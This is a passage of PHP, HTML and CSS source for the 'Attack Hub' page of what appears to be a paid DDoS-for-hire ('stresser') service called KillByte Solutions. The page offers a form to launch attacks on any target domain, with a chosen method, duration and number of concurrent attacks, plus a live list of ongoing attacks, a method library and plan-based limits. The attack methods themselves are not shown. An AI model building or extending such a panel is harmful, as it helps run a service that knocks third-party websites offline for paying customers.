            font-size: 0.9rem;
            transition: all 0.3s;
            padding: 0.3rem;
            border-radius: 8px;
            line-height: 1;
        }
        .attack-card .stop-btn:hover {
            color: var(--accent-crimson);
            background: var(--accent-crimson-dim);
        }
        .no-attacks {
            color: var(--text-tertiary);
            font-size: 0.85rem;
            text-align: center;
            padding: 2rem 0;
        }

        /* ===== METHOD LIBRARY MODAL ===== */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(60px);
            z-index: 2000;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 2rem;
        }
        .modal-overlay.active {
            display: flex;
            animation: fadeIn 0.3s var(--ease-out-expo);
        }
        .modal-content {
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            border-radius: 24px;
            padding: 2rem;
            max-width: 700px;
            width: 100%;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 40px 100px rgba(0,0,0,0.3);
            position: relative;
        }
        .modal-content .close-btn {
            position: absolute;
            top: 1.2rem;
            right: 1.5rem;
            background: none;
            border: none;
            color: var(--text-tertiary);
            font-size: 1.4rem;
            cursor: pointer;
            transition: all 0.3s;
        }
        .modal-content .close-btn:hover {
            color: var(--accent-crimson);
            transform: rotate(90deg);
        }
        .modal-content h3 {
            font-family: var(--font-display);
            font-size: 1.4rem;
            margin-bottom: 1rem;
        }
        .modal-content .search-input {
            width: 100%;
            padding: 0.8rem 1rem;
            background: rgba(255,255,255,0.005);
            border: 1px solid var(--border-subtle);
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 0.85rem;
            outline: none;
            margin-bottom: 1.5rem;
            font-family: 'Inter', sans-serif;
        }
        .modal-content .search-input::placeholder {
            color: var(--text-tertiary);
        }
        .modal-content .method-item {
            padding: 0.8rem 0;
            border-bottom: 1px solid var(--border-subtle);
            transition: all 0.2s;
        }
        .modal-content .method-item:last-child {
            border-bottom: none;
        }
        .modal-content .method-item .name {
            font-weight: 600;
            color: var(--text-primary);
            font-size: 0.9rem;
        }
        .modal-content .method-item .desc {
            color: var(--text-secondary);
            font-size: 0.8rem;
            margin-top: 0.2rem;
        }

        /* ===== NOTIFICATION ===== */
        .notification {
            position: fixed;
            top: 80px;
            right: 20px;
            padding: 1rem 1.5rem;
            border-radius: 12px;
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            backdrop-filter: blur(40px);
            color: var(--text-primary);
            z-index: 3000;
            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
            animation: slideIn 0.3s var(--ease-out-expo);
            max-width: 350px;
        }
        .notification.success { border-color: rgba(34,197,94,0.2); }
        .notification.error { border-color: rgba(204,17,17,0.2); }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            .navbar { padding: 0 1.2rem; }
            .nav-links { display: none; }
            .nav-cta { display: none; }
            .nav-auth { display: none; }
            .main-content { grid-template-columns: 1fr; padding: 100px 1rem 60px; }
            .glass-panel { padding: 1.5rem; }
            .plan-overlay-full h3 { font-size: 1.8rem; }
            .plan-overlay-full p { font-size: 1rem; }
        }
    </style>
</head>
<body>
    <!-- ===== BACKGROUND LAYERS ===== -->
    <div class="grid-container">
        <div class="grid-surface">
            <div class="grid-squares">
                <?php for ($i = 0; $i < 144; $i++): ?>
                <div class="grid-square <?php echo (rand(0, 20) === 0) ? 'highlight' : ''; ?>"></div>
                <?php endfor; ?>
            </div>
        </div>
    </div>
    <div class="crimson-reflection"></div>
    <div class="vignette-luxury"></div>
    <div class="glass-sweep"></div>

    <!-- ===== CURSOR ===== -->
    <div class="cursor-dot" id="cursor"></div>

    <!-- ===== NAVBAR ===== -->
    <nav class="navbar" id="navbar">
        <a href="#" class="nav-brand">
            <div class="nav-brand-icon">◈</div>
            <div class="nav-brand-text">KillByte<span>Solutions</span></div>
        </a>
        <div class="nav-links">
            <a href="dashboard" class="nav-link" data-i18n="nav_home">Home</a>
            <a href="hub" class="nav-link active" data-i18n="nav_hub">Attack Hub</a>
            <a href="pricing" class="nav-link" data-i18n="nav_pricing">Pricing</a>
            <a href="api" class="nav-link" data-i18n="nav_api">API</a>
            <a href="profile" class="nav-link" data-i18n="nav_profile">Profile</a>
            <?php if ($_SESSION['plan'] === 'owner' || $_SESSION['plan'] === 'admin'): ?>
            <a href="admin/dashboard" class="nav-link" data-i18n="nav_admin">Admin Dashboard</a>
            <?php endif; ?>
            <a href="logout" class="nav-link" data-i18n="nav_logout">Logout</a>
        </div>
        <div style="display:flex;align-items:center;gap:0.8rem;">
            <div class="lang-switch">
                <button class="lang-btn <?php echo $lang==='en'?'active':''; ?>" data-lang="en" onclick="switchLanguage('en')">EN</button>
                <button class="lang-btn <?php echo $lang==='zh'?'active':''; ?>" data-lang="zh" onclick="switchLanguage('zh')">中</button>
            </div>
            <button class="theme-toggle" onclick="toggleTheme()">
                <i class="fas fa-moon" id="themeIcon"></i>
            </button>
        </div>
    </nav>

    <!-- ===== FULL-SCREEN PLAN OVERLAY (shown only if no plan) ===== -->
    <?php if (!$has_plan): ?>
    <div class="plan-overlay-full">
        <div class="icon"><i class="fas fa-lock"></i></div>
        <h3 data-i18n="plan_overlay_title">Unlock Full Power</h3>
        <p data-i18n="plan_overlay_desc">You need an active plan to launch attacks. Choose a plan that fits your testing needs.</p>
        <a href="pricing" class="btn-primary" data-i18n="plan_overlay_btn"><i class="fas fa-crown"></i> View Plans</a>
    </div>
    <?php endif; ?>

    <!-- ===== MAIN CONTENT ===== -->
    <main class="main-content">
        <!-- Attack Form -->
        <div class="glass-panel" style="position:relative;">
            <div class="panel-title"><i class="fas fa-bolt"></i> <span data-i18n="form_title">Launch Attack</span></div>
            <form id="attackForm" method="POST">
                <div class="form-group">
                    <label for="target" data-i18n="form_target">Target</label>
                    <input type="text" id="target" name="target" class="form-input" required autocomplete="off" placeholder="e.g., example.com">
                </div>
                <div class="form-group">
                    <label for="method" data-i18n="form_method">Method</label>
                    <div class="method-selector" id="methodSelector">
                        <div class="selected" onclick="toggleMethodDropdown()">
                            <span id="selectedMethodText" data-i18n="form_method_placeholder">Select method...</span>
                            <span class="arrow"><i class="fas fa-chevron-down"></i></span>
                        </div>
                        <div class="dropdown" id="methodDropdown">
                            <input type="text" id="methodSearch" placeholder="<?php echo $tr['form_method_search']; ?>" oninput="filterMethods()">
                            <div id="methodOptions">
                                <?php foreach ($methods as $name => $api): ?>
                                <div class="method-option" data-value="<?php echo htmlspecialchars($name); ?>" onclick="selectMethod('<?php echo htmlspecialchars($name); ?>')">
                                    <i class="fas fa-code"></i>
                                    <?php echo htmlspecialchars($name); ?>
                                </div>
                                <?php endforeach; ?>
                                <?php if (empty($methods)): ?>
                                <div class="no-results"><?php echo $tr['no_methods']; ?></div>
                                <?php endif; ?>
                            </div>
                            <div class="no-results" id="noResults" style="display:none;">No methods found</div>
                        </div>
                    </div>
                    <input type="hidden" name="method" id="methodInput" value="">
                    <button type="button" class="method-library-btn" onclick="openMethodLibrary()"><i class="fas fa-book"></i> Library</button>
                </div>
                <div class="form-group">
                    <label for="duration" data-i18n="form_duration">Duration (seconds) - Max: <?php echo $_SESSION['running']; ?></label>
                    <input type="number" id="duration" name="duration" class="form-input" min="1" max="<?php echo $_SESSION['running']; ?>" value="60">
                </div>
                <div class="form-group">
                    <label for="concurrents" data-i18n="form_concurrents">Concurrent Attacks - Max: <?php echo $_SESSION['concurrent']; ?></label>
                    <input type="number" id="concurrents" name="concurrents" class="form-input" min="1" max="<?php echo $_SESSION['concurrent']; ?>" value="1">
                </div>
                <button type="submit" name="launch" class="nav-cta" style="width:100%;justify-content:center;padding:0.9rem;" data-i18n="form_launch"><i class="fas fa-rocket"></i> Launch Attack</button>
            </form>
        </div>

        <!-- Ongoing Attacks -->
        <div class="glass-panel">
            <div class="panel-title"><i class="fas fa-clock"></i> <span data-i18n="ongoing_title">Ongoing Attacks</span></div>
            <div class="ongoing-list" id="ongoingList">
                <?php if (empty($attacks)): ?>
                <div class="no-attacks" data-i18n="no_ongoing">No ongoing attacks.</div>
                <?php else: ?>
                <?php foreach ($attacks as $attack): ?>
                    <?php 
                        $timeLeft = $attack['end_time'] - time();
                        if ($timeLeft > 0):
                            $progress = 100 - ($timeLeft / ($attack['end_time'] - $attack['start_time']) * 100);
                    ?>
                    <div class="attack-card" data-id="<?php echo $attack['id']; ?>" data-end="<?php echo $attack['end_time']; ?>" data-start="<?php echo $attack['start_time']; ?>">
                        <div class="top-row">
                            <div class="info">
                                <div class="target" data-i18n="attack_target">Target: <?php echo htmlspecialchars($attack['target']); ?></div>
                                <div class="method" data-i18n="attack_method">Method: <?php echo htmlspecialchars($attack['method']); ?></div>
                                <div class="concurrents" data-i18n="attack_concurrents">Concurrents: <?php echo htmlspecialchars($attack['concurrents']); ?></div>
                            </div>
                            <div class="time-left"><span data-i18n="attack_timeleft">Time Left</span> <span class="countdown"><?php echo $timeLeft; ?></span>s</div>
                            <button class="stop-btn" onclick="stopAttack('<?php echo $attack['id']; ?>')" title="<?php echo $tr['attack_stop']; ?>"><i class="fas fa-stop-circle"></i></button>
                        </div>
                        <div class="progress-wrap">
                            <div class="progress-bar" style="width: <?php echo $progress; ?>%;"></div>
                        </div>
                    </div>
                    <?php endif; ?>
                <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
    </main>

    <!-- ===== METHOD LIBRARY MODAL ===== -->
    <div class="modal-overlay" id="methodLibraryModal">
        <div class="modal-content">
            <button class="close-btn" onclick="closeMethodLibrary()"><i class="fas fa-times"></i></button>
            <h3 data-i18n="method_library_title">Method Library</h3>
            <input type="text" class="search-input" id="librarySearch" placeholder="<?php echo $tr['method_library_search']; ?>" oninput="filterLibrary()">
            <div id="libraryList">
                <?php foreach ($methods as $name => $api): ?>
                <div class="method-item" data-method="<?php echo htmlspecialchars($name); ?>">
                    <div class="name"><?php echo htmlspecialchars($name); ?></div>
                    <div class="desc"><?php echo htmlspecialchars($method_descriptions[$name][$lang] ?? ''); ?></div>
                </div>
                <?php endforeach; ?>
                <?php if (empty($methods)): ?>
                <div class="method-item">
                    <div class="name"><?php echo $tr['no_methods']; ?></div>
                    <div class="desc"></div>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <!-- ===== NOTIFICATIONS ===== -->
    <?php if (isset($_SESSION['error'])): ?>
    <div class="notification error"><?php echo $_SESSION['error']; unset($_SESSION['error']); ?></div>
    <?php endif; ?>
    <?php if (isset($_SESSION['success'])): ?>
    <div class="notification success"><?php echo $_SESSION['success']; unset($_SESSION['success']); ?></div>
    <?php endif; ?>

    <!-- ===== SCRIPTS ===== -->
    <script>
        // ===== TRANSLATION SYSTEM =====
        const translations = {
            en: <?php echo json_encode($t['en']); ?>,
            zh: <?php echo json_encode($t['zh']); ?>
        };
        let currentLang = '<?php echo $lang; ?>';

        function switchLanguage(lang) {
            currentLang = lang;
            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
            document.querySelector(`.lang-btn[data-lang="${lang}"]`).classList.add('active');
            document.documentElement.setAttribute('data-lang', lang);
            // Update all data-i18n elements
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n');
                if (translations[lang] && translations[lang][key]) {
                    el.textContent = translations[lang][key];
                }
            });
            // Update placeholders for search inputs
            const methodSearch = document.getElementById('methodSearch');
            if (methodSearch) methodSearch.placeholder = translations[lang]['form_method_search'] || 'Search methods...';
            const libSearch = document.getElementById('librarySearch');
            if (libSearch) libSearch.placeholder = translations[lang]['method_library_search'] || 'Search methods...';
            // Update method descriptions in library
            document.querySelectorAll('#libraryList .method-item').forEach(item => {
                const method = item.dataset.method;
                const desc = <?php echo json_encode($method_descriptions); ?>[method]?.[lang] || '';
                item.querySelector('.desc').textContent = desc;
            });
            // Update selected method text if it's the placeholder
            const selectedText = document.getElementById('selectedMethodText');
            if (!selectedText.dataset.value) {
                selectedText.textContent = translations[lang]['form_method_placeholder'] || 'Select method...';
            }
            // Send language preference to server via fetch to persist in session
            fetch('?lang=' + lang);
        }

        // ===== THEME =====
        function toggleTheme() {
            const html = document.documentElement;
            const icon = document.getElementById('themeIcon');
            if (html.getAttribute('data-theme') === 'dark') {
                html.setAttribute('data-theme', 'light');
                icon.className = 'fas fa-sun';
                localStorage.setItem('theme', 'light');
            } else {
                html.setAttribute('data-theme', 'dark');
                icon.className = 'fas fa-moon';
                localStorage.setItem('theme', 'dark');
            }
        }

        // ===== CUSTOM METHOD SELECTOR =====
        function toggleMethodDropdown() {
            const selector = document.getElementById('methodSelector');
            selector.classList.toggle('open');
            if (selector.classList.contains('open')) {
                document.getElementById('methodSearch').focus();
            }
        }

        function selectMethod(method) {
            document.getElementById('selectedMethodText').textContent = method;
            document.getElementById('selectedMethodText').dataset.value = method;
            document.getElementById('methodInput').value = method;
            // Update selected option highlight
            document.querySelectorAll('.method-option').forEach(opt => {
                opt.classList.toggle('selected-option', opt.dataset.value === method);
            });
            document.getElementById('methodSelector').classList.remove('open');
        }

        function filterMethods() {
            const query = document.getElementById('methodSearch').value.toLowerCase();
            const options = document.querySelectorAll('.method-option');
            let visible = 0;
            options.forEach(opt => {
                const text = opt.textContent.toLowerCase();
                const match = text.includes(query);
                opt.style.display = match ? 'flex' : 'none';
                if (match) visible++;
            });
            document.getElementById('noResults').style.display = visible === 0 ? 'block' : 'none';
        }

        // Close dropdown on outside click
        document.addEventListener('click', function(e) {
            const selector = document.getElementById('methodSelector');
            if (!selector.contains(e.target)) {
                selector.classList.remove('open');
            }
        });

        // ===== METHOD LIBRARY MODAL =====
        function openMethodLibrary() {
            document.getElementById('methodLibraryModal').classList.add('active');
            document.getElementById('librarySearch').value = '';
            filterLibrary();
        }

        function closeMethodLibrary() {
            document.getElementById('methodLibraryModal').classList.remove('active');
        }

        function filterLibrary() {
            const query = document.getElementById('librarySearch').value.toLowerCase();
            const items = document.querySelectorAll('#libraryList .method-item');
            items.forEach(item => {
                const name = item.querySelector('.name').textContent.toLowerCase();
                const desc = item.querySelector('.desc').textContent.toLowerCase();
                const match = name.includes(query) || desc.includes(query);
                item.style.display = match ? 'block' : 'none';
            });
        }

        // Close modal on overlay click
        document.getElementById('methodLibraryModal').addEventListener('click', function(e) {
            if (e.target === this) closeMethodLibrary();
        });

        // ===== ONGOING ATTACKS: LIVE COUNTDOWN & PROGRESS =====
        function updateAttacks() {
            const now = Math.floor(Date.now() / 1000);
            const cards = document.querySelectorAll('.attack-card');
            cards.forEach(card => {
                const end = parseInt(card.dataset.end);
                const start = parseInt(card.dataset.start);
                const timeLeft = end - now;
                const countdownSpan = card.querySelector('.countdown');
                if (countdownSpan) {
                    if (timeLeft <= 0) {
                        // Attack ended – remove card
                        card.style.opacity = '0';
                        card.style.transform = 'translateX(20px)';
                        setTimeout(() => card.remove(), 300);
                        // Refresh list if empty
                        if (document.querySelectorAll('.attack-card').length === 0) {
                            document.getElementById('ongoingList').innerHTML = `<div class="no-attacks" data-i18n="no_ongoing">No ongoing attacks.</div>`;
                        }
                    } else {
                        countdownSpan.textContent = timeLeft;
                        const total = end - start;
                        const progress = 100 - (timeLeft / total * 100);
                        card.querySelector('.progress-bar').style.width = progress + '%';
                    }
                }
            });
        }

        // ===== STOP ATTACK =====
        function stopAttack(attackId) {
            if (!confirm('Stop this attack?')) return;
            fetch('?action=stop_attack&id=' + attackId)
                .then(response => response.text())
                .then(() => {
                    // Remove card from UI
                    const card = document.querySelector(`.attack-card[data-id="${attackId}"]`);
                    if (card) {
                        card.style.opacity = '0';
                        card.style.transform = 'translateX(20px)';
                        setTimeout(() => {
                            card.remove();
                            if (document.querySelectorAll('.attack-card').length === 0) {
                                document.getElementById('ongoingList').innerHTML = `<div class="no-attacks" data-i18n="no_ongoing">No ongoing attacks.</div>`;
                            }
                        }, 300);
                    }
                })
                .catch(err => console.error('Stop failed:', err));
        }

        // Update every second
        setInterval(updateAttacks, 1000);
        updateAttacks();

        // ===== LENIS SMOOTH SCROLL =====
        const lenis = new Lenis({ duration: 1.2, smoothWheel: true, lerp: 0.08 });
        function raf(time) { lenis.raf(time); requestAnimationFrame(raf); }
        requestAnimationFrame(raf);

        // ===== NAVBAR SCROLL EFFECT =====
        const navbar = document.getElementById('navbar');
        window.addEventListener('scroll', () => {
            if (window.scrollY > 50) navbar.classList.add('scrolled');
            else navbar.classList.remove('scrolled');
        });

        // ===== CURSOR =====
        const cursor = document.getElementById('cursor');
        let cursorX = 0, cursorY = 0, targetX = 0, targetY = 0;
        if (window.matchMedia('(pointer: fine)').matches) {
            document.addEventListener('mousemove', (e) => { targetX = e.clientX; targetY = e.clientY; });
            function animateCursor() {
                cursorX += (targetX - cursorX) * 0.15;
                cursorY += (targetY - cursorY) * 0.15;
                cursor.style.left = cursorX + 'px';
                cursor.style.top = cursorY + 'px';
                requestAnimationFrame(animateCursor);
            }
            animateCursor();
            document.querySelectorAll('a, button, .plan-card, .crypto-option, .faq-question, .suite-card, .attack-card, .method-option').forEach(el => {
                el.addEventListener('mouseenter', () => cursor.classList.add('expanded'));
                el.addEventListener('mouseleave', () => cursor.classList.remove('expanded'));
            });
        }

        // ===== GRID SQUARE HOVER =====
        document.querySelectorAll('.grid-square').forEach(sq => {
            sq.addEventListener('mouseenter', () => {
                sq.style.borderColor = 'rgba(204,17,17,0.08)';
                sq.style.background = 'rgba(204,17,17,0.01)';
            });
            sq.addEventListener('mouseleave', () => {
                sq.style.borderColor = '';
                sq.style.background = '';
            });
        });

        // ===== AUTO-HIDE NOTIFICATIONS =====
        document.addEventListener('DOMContentLoaded', function() {
            const notifications = document.querySelectorAll('.notification');
            notifications.forEach(notif => {
                setTimeout(() => {
                    notif.style.opacity = '0';
                    notif.style.transform = 'translateX(40px)';
                    setTimeout(() => notif.remove(), 300);
                }, 4000);
            });
        });

        // ===== PERSIST LANGUAGE =====
        // The language is already stored in session via PHP; we also update via fetch on switch
        // to keep session in sync with frontend.

        // ===== INIT =====
        document.addEventListener('DOMContentLoaded', function() {
            // Set initial selected method if any
            const methodInput = document.getElementById('methodInput');
            if (methodInput.value) {
                document.getElementById('selectedMethodText').textContent = methodInput.value;
                document.getElementById('selectedMethodText').dataset.value = methodInput.value;
                document.querySelectorAll('.method-option').forEach(opt => {
                    opt.classList.toggle('selected-option', opt.dataset.value === methodInput.value);
                });
            }
            // Theme
            const savedTheme = localStorage.getItem('theme');
            if (savedTheme === 'light') {
                document.documentElement.setAttribute('data-theme', 'light');
                document.getElementById('themeIcon').className = 'fas fa-sun';
            }
        });
    </script>
</body>
</html>